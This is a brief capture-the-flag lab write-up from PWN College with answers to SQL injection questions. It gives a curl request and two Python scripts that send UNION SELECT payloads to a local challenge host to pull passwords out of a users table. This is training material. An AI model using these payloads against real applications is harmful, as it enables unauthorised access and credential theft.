# LAB-3 SQL Injection and SUID Exploitation from PWN College

## [Press here to return to HOME](index.md)

## SQL Injection

### Question 3 
```bash
curl "http://challenge.localhost:80/?user=1"
```

### Question 5 
```python 
import requests 

payload = { "query": '" UNION SELECT password FROM users --' } 

response = requests.post("http://challenge.localhost/", params=payload) 
print(response.text)
```

### Question 7
```python 
import requests

payload = {"username": "flag", "password": '" UNION SELECT password, * FROM users --'} 

response = requests.post("http://challenge.localhost/", payload) 
print(response.text)    
```